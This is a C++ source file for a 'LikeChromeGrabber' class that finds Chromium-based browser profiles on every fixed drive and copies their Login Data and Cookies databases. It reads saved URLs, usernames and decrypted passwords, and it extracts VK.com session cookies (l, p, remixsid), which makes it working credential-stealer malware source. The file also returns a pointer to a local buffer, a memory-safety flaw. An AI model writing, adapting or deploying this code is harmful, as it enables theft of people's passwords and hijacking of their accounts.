#include "LikeChromeGrabber.h"


#include <iostream>
using namespace std;


LikeChromeGrabber::LikeChromeGrabber(const wchar_t* path, const wchar_t* user_tt) {
	browserPath = wcsdup(path);
	user_t = wcsdup(user_tt);
	DWORD dr = GetLogicalDrives();
	for (int i = 0; i < 26; ++i)
		if ((dr>>i)&1) {
			wstring path;
			path += (wchar_t)(65+i);
			path += L":\\";
			UINT drive_type = GetDriveType(path.c_str());
			if (drive_type == DRIVE_FIXED) {
				wchar_t *dis = new wchar_t[2];
				dis[1] = 0;
				dis[0] = (wchar_t)(65+i);
				discs.push_back(dis);
			}
		}
}

vector <IGrabber::Profile> LikeChromeGrabber::grabPasswords() {
	vector <Profile> res;
	for (int i = 0; i < discs.size(); ++i) {
		const wchar_t *path = copyTable(discs[i], L"Login Data");
		if (path == NULL)
			continue;
		vector <Profile> ps = sqlPasswordsQuery(path);
		for (int i = 0; i < ps.size(); ++i)
			res.push_back(ps[i]);
	}
	return res;
}

vector <IGrabber::Cookie> LikeChromeGrabber::grabCookies() {
	vector <Cookie> res;
	for (int i = 0; i < discs.size(); ++i) {
		const wchar_t *path = copyTable(discs[i], L"Cookies");
		if (path == NULL)
			continue;
		vector <Cookie> ps = sqlCookiesQuery(path);
		for (int i = 0; i < ps.size(); ++i)
			res.push_back(ps[i]);
	}
	return res;
}

const wchar_t* LikeChromeGrabber::copyTable(const wchar_t* disc, const wchar_t* nameOfTable) {
	wchar_t DB_WAY[1024] = {0};
	wcscat(DB_WAY, disc);
	wcscat(DB_WAY, browserPath);
	wcscat(DB_WAY, nameOfTable); 
	if (!fileExists(DB_WAY)) 
		return NULL;

	wchar_t TO_DB_WAY[1024] = {0};
	wcscat(TO_DB_WAY, disc);
	wcscat(TO_DB_WAY, L":\\Users\\");
	wcscat(TO_DB_WAY, user_t);
	wcscat(TO_DB_WAY, L"\\Documents\\");
	wcscat(TO_DB_WAY, nameOfTable);

	CopyFile(DB_WAY, TO_DB_WAY, FALSE);
	return TO_DB_WAY;
}

vector <IGrabber::Profile> LikeChromeGrabber::sqlPasswordsQuery(const wchar_t* DB_WAY) {
	sqlite3 *db;
	char *zErrMsg = 0;

	int rc = sqlite3_open16(DB_WAY, &db);
	if (rc) {
		printf("error open");
		//_getch();
		exit(1);
	}

	sqlite3_stmt * stmt;
	const char *sql = "SELECT action_url, username_value, password_value FROM logins;";
	rc = sqlite3_prepare_v2(db, sql, strlen (sql) + 1, &stmt, NULL);

	if (rc) {
		printf("error query");
		//_getch();
		exit(2);
	}

	vector <IGrabber::Profile> res;
	while (sqlite3_step(stmt) == SQLITE_ROW) {
		wstring url = (const wchar_t*)sqlite3_column_text16(stmt, 0);
		wstring login = (const wchar_t*)sqlite3_column_text16(stmt, 1);
		
		int bytes = sqlite3_column_bytes(stmt, 2);
		const char *blob = (const char*) sqlite3_column_blob(stmt, 2);
		wstring pass = fromCharToWChar(decodeBlob(blob, bytes));
		res.push_back(Profile(url, login, pass));
	}
	return res;
}

vector <IGrabber::Cookie> LikeChromeGrabber::sqlCookiesQuery(const wchar_t* DB_WAY) {
	sqlite3 *db;
	char *zErrMsg = 0;

	int rc = sqlite3_open16(DB_WAY, &db);
	if (rc) {
		printf("error open");
		//_getch();
		exit(1);
	}

	sqlite3_stmt * stmt;
	const char *sql = "SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key = '.vk.com' or host_key = '.login.vk.com';";
	rc = sqlite3_prepare_v2(db, sql, strlen(sql) + 1, &stmt, NULL);

	if (rc) {
		printf("error query");
		//_getch();
		exit(2);
	}

	vector <Cookie> res;
	while (sqlite3_step(stmt) == SQLITE_ROW) {
		wstring url = (const wchar_t*)sqlite3_column_text16(stmt, 0);
		wstring name = (const wchar_t*)sqlite3_column_text16(stmt, 1);
		wstring  value = (const wchar_t*)sqlite3_column_text16(stmt, 2);


		int bytes = sqlite3_column_bytes(stmt, 3);
		const char *blob = (const char*)sqlite3_column_blob(stmt, 3);
		wstring encr_value;
		if (blob == NULL)
			encr_value = L"";
		else
			encr_value = fromCharToWChar(decodeBlob(blob, bytes));

		if (name == L"l" || name == L"p" || name == L"remixsid") {
			if (value == L"")
				res.push_back(IGrabber::Cookie(url, name, encr_value));
			else
				res.push_back(IGrabber::Cookie(url, name, value));
		}
	}
	return res;
}

bool LikeChromeGrabber::fileExists(LPCTSTR fname) {
	return GetFileAttributes(fname) != DWORD(-1);
}